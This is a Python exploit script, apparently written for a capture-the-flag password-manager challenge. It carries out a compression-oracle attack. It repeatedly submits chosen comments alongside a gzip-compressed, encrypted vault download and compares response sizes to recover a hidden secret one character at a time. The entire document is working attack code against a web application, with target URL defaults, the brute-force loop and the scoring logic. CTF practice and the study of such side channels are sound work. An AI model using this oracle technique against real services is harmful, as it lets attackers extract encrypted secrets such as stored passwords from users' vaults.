#!/usr/bin/env python3
"""
Compression Oracle Exploit for Password Vault

Steps:
1. Go to browse-vault
2. Select specified vault to download
3. Enter comment and download encrypted vault
4. Use compression oracle to bruteforce flag character by character

The attack works because when our comment starts with FLAG and matches
the actual flag content, gzip compression will be more effective,
resulting in smaller encrypted vault size.

Usage: python exploit_flag_vault.py <vault_name>
"""

import requests
import string
import time
import sys
import os
import argparse

sys.path.append(
    "/home/x3ero0/Research/ctf-academy/CTFs/attackdefense_1/challenges/password-manager"
)


class FlagVaultExploit:
    def __init__(self, base_url="http://192.168.56.10:3333"):
        self.base_url = base_url
        self.session = requests.Session()
        self.charset = string.printable

    def browse_vaults(self, vault_name):
        response = self.session.get(f"{self.base_url}/browse-vaults")
        if response.status_code != 200:
            return None

        html = response.text

        import re

        # Look for table rows containing the specified vault name and extract vault ID
        # Pattern: <td>ID</td> followed by <td><strong>VAULT_NAME</strong></td>
        # More precise: match the exact vault name in <strong> tags
        vault_pattern = rf"<td>(\d+)</td>\s*<td[^>]*><strong>{re.escape(vault_name)}</strong></td>"
        vault_match = re.search(vault_pattern, html, re.DOTALL | re.IGNORECASE)

        if vault_match:
            vault_id = vault_match.group(1)
            print(f"DEBUG: Found vault '{vault_name}' with ID {vault_id}")
            return vault_id
        else:
            # Try alternate pattern with download links
            alt_pattern = rf'<a href="/download/(\d+)"[^>]*>Download</a>.*?<strong>{re.escape(vault_name)}</strong>'
            alt_match = re.search(alt_pattern, html, re.DOTALL | re.IGNORECASE)
            if alt_match:
                vault_id = alt_match.group(1)
                print(f"DEBUG: Found vault '{vault_name}' with ID {vault_id} via download link")
                return vault_id

        print(f"Vault '{vault_name}' not found. Available vaults in HTML:")
        vault_links = re.findall(r"/download/(\d+)", html)
        vault_names = re.findall(r"<strong>([^<]+)</strong>", html)
        for i, (link, name) in enumerate(zip(vault_links[:5], vault_names[:5])):  # Show first 5
            print(f"   Vault ID: {link} - Name: {name}")

        return None

    def download_vault_with_comment(self, vault_id, comment):
        download_url = f"{self.base_url}/download/{vault_id}"
        print(download_url)
        response = self.session.get(download_url)
        if response.status_code != 200:
            return None

        download_data = {"comment": comment}

        response = self.session.post(download_url, data=download_data)
        if response.status_code == 200:
            encrypted_bytes = response.content
            size = len(encrypted_bytes)
            return size

        else:
            if response.text:
                print(f"Response: {response.text[:200]}...")
            return None

    def get_baseline_size(self, vault_id):
        size = self.download_vault_with_comment(vault_id, "")
        return size


def main():
    parser = argparse.ArgumentParser(
        description="Compression Oracle Exploit for Password Vault"
    )
    parser.add_argument("vault_name", help="Name of the vault to exploit")
    parser.add_argument(
        "--url",
        default="http://192.168.56.10:3333",
        help="Base URL of the target (default: http://192.168.56.10:3333)",
    )

    args = parser.parse_args()

    exploit = FlagVaultExploit(args.url)
    try:
        print(f"Finding vault '{args.vault_name}'...")
        vault_id = exploit.browse_vaults(args.vault_name)
        if not vault_id:
            print(f"Vault '{args.vault_name}' not found!")
            return

        candidate = "https://x3ero0.dev,admin,https://x3ero0.dev,admin,FLAG_"
        charset = string.printable

        print(f"Starting bruteforce with known prefix: '{candidate}'")

        baseline_size = exploit.download_vault_with_comment(vault_id, candidate)
        if baseline_size is None:
            print("Failed to get baseline size")
            return

        print(f"Baseline size for '{candidate}': {baseline_size} bytes")

        max_iterations = 50

        for iteration in range(max_iterations):
            print(f"\nIteration {iteration + 1}: Extending '{candidate}'")

            # Test current candidate
            current_size = exploit.download_vault_with_comment(vault_id, candidate)
            if current_size is None:
                print("Failed to get current size")
                break

            print(f"Current size: {current_size} bytes")

            # Reset variables for next character search
            best_char = None
            best_size = current_size
            best_improvement = 0

            # Test all characters and compare against wrong attempts
            char_scores = []

            # Get wrong candidate size once for comparison
            wrong_candidate = candidate + "*"  # Use * as wrong character
            wrong_size = exploit.download_vault_with_comment(vault_id, wrong_candidate)
            if wrong_size is None:
                print("Failed to get wrong candidate size")
                break

            # Track the best improvement found so far
            current_best_improvement = 0

            for ch in charset:
                correct_candidate = candidate + ch
                correct_size = exploit.download_vault_with_comment(
                    vault_id, correct_candidate
                )

                if correct_size is not None:
                    # Compare correct vs wrong (smaller correct size is better)
                    improvement = wrong_size - correct_size
                    char_scores.append((ch, correct_size, wrong_size, improvement))
                    print(
                        f"  '{correct_candidate}' -> {correct_size} bytes vs '{wrong_candidate}' -> {wrong_size} bytes ({improvement:+d})"
                    )

                    # Track the best character found so far
                    if improvement > current_best_improvement:
                        current_best_improvement = improvement
                        best_char = ch
                        best_size = correct_size
                        best_improvement = improvement
                        print(
                            f"  New best character: '{ch}' with {improvement}+ bytes improvement"
                        )

                    # Only break early if we find a very significant improvement (>= 5 bytes)
                    # This reduces false positives while still optimizing speed
                    if improvement >= 5:
                        print(
                            f"Found very significant improvement ({improvement}+ bytes), breaking early"
                        )
                        break

            # If we didn't break early, find the best from all tested
            if best_char is None and char_scores:
                # Sort by improvement (biggest positive difference is best)
                char_scores.sort(key=lambda x: x[3], reverse=True)
                best_char, best_size, wrong_size, best_improvement = char_scores[0]
            elif not char_scores and best_char is None:
                print("No valid character results")
                break

            print(
                f"\nBest character: '{best_char}' -> {best_size} bytes (vs wrong: {wrong_size}, improvement: {best_improvement:+d})"
            )

            # Only add if there's improvement over wrong attempt
            if best_improvement > 0:
                candidate += best_char
                print(
                    f"New candidate: '{candidate}' (improvement: {best_improvement:+d})"
                )
                baseline_size = best_size
            else:
                print("No character shows improvement over wrong attempt")
                break

            # Stop after reasonable length
            # if len(candidate) > 60:
            #     print("Reached maximum reasonable URL length")
            #     break

        print(f"\nFinal extracted URL: '{candidate}'")

    except KeyboardInterrupt:
        print("\nExploit interrupted by user")
    except Exception as e:
        print(f"\nExploit error: {e}")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    main()
